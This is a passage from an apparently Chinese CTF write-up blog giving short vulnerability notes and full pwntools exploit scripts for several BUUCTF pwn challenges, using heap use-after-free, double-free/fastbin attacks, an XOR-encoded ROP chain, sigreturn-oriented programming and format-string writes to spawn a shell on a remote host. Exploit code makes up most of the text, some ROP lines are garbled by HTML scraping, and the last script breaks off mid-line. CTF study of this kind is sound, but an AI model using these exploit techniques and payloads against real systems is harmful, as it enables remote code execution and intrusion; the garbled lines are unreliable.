class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_n_3")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def addStr(idx,size,content):</span><br><span class="line">	sh.recvuntil("CNote > ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Index > ")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil("Type > ")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Length > ")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	if content != "":</span><br><span class="line">		sh.recvuntil("Value > ")</span><br><span class="line">		sh.send(content)</span><br><span class="line">def addInt(idx,num):</span><br><span class="line">        sh.recvuntil("CNote > ")</span><br><span class="line">        sh.sendline("1")</span><br><span class="line">        sh.recvuntil("Index > ")</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line">        sh.recvuntil("Type > ")</span><br><span class="line">        sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Value > ")</span><br><span class="line">	sh.sendline(str(num))</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil("CNote > ")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil("Index > ")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil("CNote > ")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Index > ")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_n_3")</span><br><span class="line">		main_arena_offset = 0xf7763780 - 0xf75b1000</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">		main_arena_offset = 0x1B0780</span><br><span class="line">	#leak libc</span><br><span class="line">	addStr(0,0x80,"a"*0x7E + "\n")</span><br><span class="line">	addInt(1,0xdeadbeef)</span><br><span class="line">	free(0)</span><br><span class="line">	addStr(2,0,"")</span><br><span class="line">	show(2)</span><br><span class="line">	sh.recvuntil("Note(Type=String, Value=")</span><br><span class="line">	main_arena = u32(sh.recv(4)) - 176</span><br><span class="line">	libc = main_arena - main_arena_offset</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	one_gadget = libc + 0x3a80c</span><br><span class="line"></span><br><span class="line">	#getShell</span><br><span class="line">        addStr(3,0x48,"a"*0x3E + "\n")</span><br><span class="line">	addInt(4,0xdeadbeef)</span><br><span class="line">	free(4)</span><br><span class="line">	payload = "sh\x00\x00" + p32(system) + p32(0xdeadbeef) + '\n'</span><br><span class="line">	addStr(5,0x14,payload)	</span><br><span class="line">	free(4)</span><br><span class="line">	log.success("main_arena: " + hex(main_arena))</span><br><span class="line">        log.success("binsh: " + hex(binsh))</span><br><span class="line">        log.success("system: " + hex(system))</span><br><span class="line">        log.success("libc: " + hex(libc))	</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20139,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x22-ciscn-s-8"><a href="#0x22-ciscn-s-8" class="headerlink" title="0x22 ciscn_s_8"></a>0x22 ciscn_s_8</h2><h3 id="导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload"><a href="#导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload" class="headerlink" title="导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload"></a>导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload</h3><h3 id="另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add-rax-1换成add-rax-3，缩短ROPchain，达成攻击。注意不换成add-rax-3会出现ROPchain被截断的情况"><a href="#另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add-rax-1换成add-rax-3，缩短ROPchain，达成攻击。注意不换成add-rax-3会出现ROPchain被截断的情况" class="headerlink" title="另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add rax,1换成add rax,3，缩短ROPchain，达成攻击。注意不换成add rax,3会出现ROPchain被截断的情况"></a>另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add rax,1换成add rax,3，缩短ROPchain，达成攻击。注意不换成add rax,3会出现ROPchain被截断的情况</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_s_8")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def encrypt(data):</span><br><span class="line">	crypto = ''</span><br><span class="line">	for i in data:</span><br><span class="line">		crypto += chr(ord(i) ^ 0x66)</span><br><span class="line">	return crypto</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_s_8")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	from struct import pack</span><br><span class="line"></span><br><span class="line">	# Padding goes here</span><br><span class="line">	p = ''</span><br><span class="line">	p += pack('<q', 0x00000000004040fe) # pop rsi ; ret< span><br><span class="line">	p += pack('<q', 0x00000000006ba0e0) # @ .data< span><br><span class="line">	p += pack('<q', 0x0000000000449b9c) # pop rax ; ret< span><br><span class="line">	p += '/bin//sh'</span><br><span class="line">	p += pack('<q', 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">	p += pack('<q', 0x00000000004040fe) # pop rsi ; ret< span><br><span class="line">	p += pack('<q', 0x00000000006ba0e8) # @ .data + 8< span><br><span class="line">	p += pack('<q', 0x0000000000444f00) # xor rax, rax ; ret< span><br><span class="line">	p += pack('<q', 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">	p += pack('<q', 0x00000000004006e6) # pop rdi ; ret< span><br><span class="line">	p += pack('<q', 0x00000000006ba0e0) # @ .data< span><br><span class="line">	p += pack('<q', 0x00000000004040fe) # pop rsi ; ret< span><br><span class="line">	p += pack('<q', 0x00000000006ba0e8) # @ .data + 8< span><br><span class="line">	p += pack('<q', 0x0000000000449bf5) # pop rdx ; ret< span><br><span class="line">	p += pack('<q', 0x00000000006ba0e8) # @ .data + 8< span><br><span class="line">	p += pack('<q', 0x0000000000444f00) # xor rax, rax ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 2 0x0000000000474bf8) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 0x00000000004751a5) # syscall ; ret< span><br><span class="line">	offset = 10 * 8</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p</span><br><span class="line">	sh.send(encrypt(payload))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20159,0)</span><br></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></pre></td></tr></tbody></table></figure></div>


<h2 id="0x23-ciscn-s-3"><a href="#0x23-ciscn-s-3" class="headerlink" title="0x23 ciscn_s_3"></a>0x23 ciscn_s_3</h2><h3 id="gadget处可以赋值rax为15，恰好为SYS-SigReturnFrame"><a href="#gadget处可以赋值rax为15，恰好为SYS-SigReturnFrame" class="headerlink" title="gadget处可以赋值rax为15，恰好为SYS_SigReturnFrame"></a>gadget处可以赋值rax为15，恰好为SYS_SigReturnFrame</h3><h3 id="那么思路如下"><a href="#那么思路如下" class="headerlink" title="那么思路如下:"></a>那么思路如下:</h3><h3 id="1、先leak-stack地址，然后顺带的传入-bin-sh-x00字符串，通过leak-stack来定位binsh的位置，再跳回SYS-read处"><a href="#1、先leak-stack地址，然后顺带的传入-bin-sh-x00字符串，通过leak-stack来定位binsh的位置，再跳回SYS-read处" class="headerlink" title="1、先leak stack地址，然后顺带的传入/bin/sh\x00字符串，通过leak stack来定位binsh的位置，再跳回SYS_read处"></a>1、先leak stack地址，然后顺带的传入/bin/sh\x00字符串，通过leak stack来定位binsh的位置，再跳回SYS_read处</h3><h3 id="2、赋值rax为15，跳到syscall上，成功popal-sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell"><a href="#2、赋值rax为15，跳到syscall上，成功popal-sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell" class="headerlink" title="2、赋值rax为15，跳到syscall上，成功popal sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell"></a>2、赋值rax为15，跳到syscall上，成功popal sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_s_6")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_s_6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">	syscall_ret = 0x400517</span><br><span class="line">	mov_rax_ret = 0x4004DA</span><br><span class="line">	write_ret = 0x400503</span><br><span class="line">	read_write_ret = 0x4004F1</span><br><span class="line">	offset = 16</span><br><span class="line">	payload  = "//bin/sh\x00"</span><br><span class="line">	payload  = payload.ljust(offset,"a")</span><br><span class="line">	payload += p64(write_ret) + p64(read_write_ret)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	stack_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))</span><br><span class="line">	binsh = stack_addr - 0x118</span><br><span class="line">	sigframe = SigreturnFrame()</span><br><span class="line">	sigframe.rax = constants.SYS_execve</span><br><span class="line">	sigframe.rdi = binsh</span><br><span class="line">	sigframe.rsp = stack_addr</span><br><span class="line">	sigframe.rip = syscall_ret</span><br><span class="line">	sigframe.rsi = 0</span><br><span class="line">	sigframe.rdx = 0</span><br><span class="line">	payload = offset * "a" + p64(mov_rax_ret) + p64(syscall_ret) + str(sigframe)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	log.success("stack_addr: " + hex(stack_addr))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20154,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x24-ciscn-2019-nw-6"><a href="#0x24-ciscn-2019-nw-6" class="headerlink" title="0x24 ciscn_2019_nw_6"></a>0x24 ciscn_2019_nw_6</h2><h3 id="程序没有任何保护，考虑shellcode"><a href="#程序没有任何保护，考虑shellcode" class="headerlink" title="程序没有任何保护，考虑shellcode"></a>程序没有任何保护，考虑shellcode</h3><h3 id="利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去"><a href="#利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去" class="headerlink" title="利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去"></a>利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ciscn_2019_nw_6")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_nw_6")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	#0804A160</span><br><span class="line">	#leak ebp</span><br><span class="line">	sh.recv()</span><br><span class="line">	payload = "%12$p"</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recvuntil("0x")</span><br><span class="line">	ebp = int(sh.recv(8),16)</span><br><span class="line">	ret_addr = ebp + 0xc - 6*0x4</span><br><span class="line"></span><br><span class="line">	payload = "%." + str(ret_addr % 0x10000) + "d%23$hn"</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	payload = "%." + str(0xA170) + "d%59$hn"</span><br><span class="line">	payload = payload.ljust(4*4,"\x00")</span><br><span class="line">	payload += asm(shellcraft.i386.sh())</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline("hello")</span><br><span class="line">	log.success("ebp: " + hex(ebp))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20151,0)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x25-judgement-mna-2016"><a href="#0x25-judgement-mna-2016" class="headerlink" title="0x25 judgement_mna_2016"></a>0x25 judgement_mna_2016</h2><h3 id="导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过-xx-s来读取文本"><a href="#导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过-xx-s来读取文本" class="headerlink" title="导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过$xx%s来读取文本"></a>导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过$xx%s来读取文本</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("judgement_mna_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./judgement_mna_2016")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	payload = "%28$s"</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20077,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x26-ciscn-nw-4"><a href="#0x26-ciscn-nw-4" class="headerlink" title="0x26 ciscn_nw_4"></a>0x26 ciscn_nw_4</h2><h3 id="1、经过ida分析存在double-free，且show没有check，所以可以leak-heap-base和libc"><a href="#1、经过ida分析存在double-free，且show没有check，所以可以leak-heap-base和libc" class="headerlink" title="1、经过ida分析存在double free，且show没有check，所以可以leak heap_base和libc"></a>1、经过ida分析存在double free，且show没有check，所以可以leak heap_base和libc</h3><h3 id="2、通过fastbin-attack修改unsorted-bin’s-bk，在free-hook处伪造fake-chunk，然后再用double-free-fastbin-attack修改free-hook的值为system，然后释放content为-bin-sh-x00的chunk即可"><a href="#2、通过fastbin-attack修改unsorted-bin’s-bk，在free-hook处伪造fake-chunk，然后再用double-free-fastbin-attack修改free-hook的值为system，然后释放content为-bin-sh-x00的chunk即可" class="headerlink" title="2、通过fastbin attack修改unsorted bin’s bk，在free_hook处伪造fake_chunk，然后再用double free fastbin attack修改free_hook的值为system，然后释放content为/bin/sh\x00的chunk即可"></a>2、通过fastbin attack修改unsorted bin’s bk，在<strong>free_hook处伪造fake_chunk，然后再用double free fastbin attack修改</strong>free_hook的值为system，然后释放content为/bin/sh\x00的chunk即可</h3><h3 id="最终因为ubuntu16-04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub-rsp-0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃"><a href="#最终因为ubuntu16-04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub-rsp-0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃" class="headerlink" title="最终因为ubuntu16.04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub rsp,0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃"></a>最终因为ubuntu16.04的环境问题拿不到flag，经过分析发现，是因为system函数里存在<code>sub rsp,0xNNN</code>，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_nw_4")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def inputName(name):</span><br><span class="line">	sh.recvuntil("what is your name?")</span><br><span class="line">	sh.send(name)</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(">> ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("size?")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("content?")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(">> ")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil("index ?")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(">> ")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("index ?\n")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_nw_4")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">		main_arena_offset = 0x3C4B20</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">		main_arena_offset = 0x3C4B20</span><br><span class="line">	inputName("fuck")</span><br><span class="line">	#leak libc</span><br><span class="line">	add(0x80,"\x11"*0x80) #idx 0</span><br><span class="line">	add(0x18,"\x12"*0x18) 